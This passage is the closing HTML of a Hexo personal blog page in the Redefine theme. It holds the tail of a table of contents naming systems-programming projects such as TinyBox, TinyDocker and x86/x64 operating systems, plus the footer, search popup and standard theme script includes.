class="nav-link" href="#NetFS"><span class="nav-text">NetFS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%AB%98%E5%B9%B6%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-text">高并发服务器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BD%91%E7%BB%9C%E8%A7%86%E9%A2%91%E7%9B%91%E6%8E%A7"><span class="nav-text">网络视频监控</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TinyBox"><span class="nav-text">TinyBox</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#x86-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F"><span class="nav-text">x86 操作系统</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#x64-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F"><span class="nav-text">x64 操作系统</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TinyDocker"><span class="nav-text">TinyDocker</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TinyNetbox"><span class="nav-text">TinyNetbox</span></a></li></ol></li></ol>

	</div>
</div>
	</div>
	
</div>
			</div>

			
		</div>

		<div class="main-content-footer">
			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
            <div class="customize-info my-1">关山初度尘未洗，策马扬鞭再奋蹄。</div>
        
        <div class="text-center">
            &copy;
            
              <span>2023</span>
              -
            
            2025&nbsp;&nbsp;<i class="fa-solid fa-circle-info fa-beat-fade" style="--fa-beat-fade-opacity: 0.67; --fa-beat-fade-scale: 1.075;" ></i>&nbsp;&nbsp;<a href="/">韩乔落</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        134 posts in total
                    </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.2</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
		</div>
	</div>

	
	<div class="post-tools">
		<div class="post-tools-container">
	<ul class="article-tools-list">
		<!-- TOC aside toggle -->
		
		<li class="right-bottom-tools page-aside-toggle">
			<i class="fa-regular fa-outdent"></i>
		</li>
		

		<!-- go comment -->
		
		<li class="go-comment">
			<i class="fa-regular fa-comments"></i>
		</li>
		
	</ul>
</div>
	</div>
	

	<div class="right-side-tools-container">
		<div class="side-tools-container">
	<ul class="hidden-tools-list">
		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-plus"></i>
		</li>

		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-minus"></i>
		</li>

		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
			<i class="fa-regular fa-moon"></i>
		</li>

		<!-- rss -->
		

		

		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
			<i class="fa-regular fa-arrow-down"></i>
		</li>
	</ul>

	<ul class="visible-tools-list">
		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
			<i class="fa-regular fa-cog fa-spin"></i>
		</li>
		
		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
			<i class="arrow-up fas fa-arrow-up"></i>
			<span class="percent"></span>
		</li>
		
		
	</ul>
</div>
	</div>

	<div class="image-viewer-container">
	<img src="">
</div>

	
	<div class="search-pop-overlay">
	<div class="popup search-popup">
		<div class="search-header">
			<span class="search-input-field-pre">
				<i class="fa-solid fa-keyboard"></i>
			</span>
			<div class="search-input-container">
				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
			</div>
			<span class="popup-btn-close">
				<i class="fa-solid fa-times"></i>
			</span>
		</div>
		<div id="search-result">
			<div id="no-result">
				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
			</div>
		</div>
	</div>
</div>
	

</main>


<script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/Swup.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/SwupSlideTheme.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/SwupScriptsPlugin.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/SwupProgressPlugin.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/SwupScrollPlugin.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/SwupPreloadPlugin.min.js" ></script>
<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>




	<script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/imageViewer.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/utils.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/main.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/layouts/navbarShrink.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/scrollTopBottom.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/lightDarkSwitch.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/layouts/categoryList.js" ></script>


    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/localSearch.js" ></script>



    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/codeBlock.js" ></script>



    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/layouts/lazyload.js" ></script>



    <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/runtime.js" ></script>
    <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/odometer.min.js" ></script>
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/assets/odometer-theme-minimal.css">



  <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/Typed.min.js" ></script>
  <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/plugins/typed.js" ></script>







    <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/anime.min.js" ></script>




    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/tocToggle.js" data-swup-reload-script></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/layouts/toc.js" data-swup-reload-script></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/plugins/tabs.js" data-swup-reload-script></script>


<script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/moment-with-locales.min.js" data-swup-reload-script></script>
<script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/layouts/essays.js" data-swup-reload-script></script>




	
</body>

</html>